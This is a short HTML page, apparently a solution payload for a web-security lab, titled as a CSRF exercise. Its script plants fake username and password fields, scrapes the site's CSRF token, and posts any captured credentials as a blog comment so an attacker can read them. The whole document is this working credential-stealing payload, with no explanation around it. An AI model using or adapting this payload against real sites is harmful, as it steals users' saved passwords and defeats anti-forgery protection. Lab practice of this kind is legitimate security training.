
<html>
    <head>
        <title>CSRF - Without BurpSuite Pro</title>
    </head>
    <body>
        <script>
            function hacked(username, password) {		
                var req = new XMLHttpRequest();
                req.open('get','/post?postId=3',true);
                req.send();
                req.onreadystatechange = function () {
                    csrf = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
                    this.onload = handleResponse(username, password);
                }	
            }	
        
            function handleResponse(username, password) {
                console.log(csrf);
                var cookie = document.cookie
                document.cookie = cookie;
                fetch('/post/comment', {
                method: 'POST',
                mode: 'no-cors',
                body: 'csrf='+csrf+'&postId=3&comment='+username+':'+password+'&name=asdf&email=adsf%40adf&website=http://localhost'
                });
            }
        </script>
        <input name=username id=username>
        <input type=password name=password onchange="if(this.value.length)hacked(username.value, this.value);">
    </body>
</html>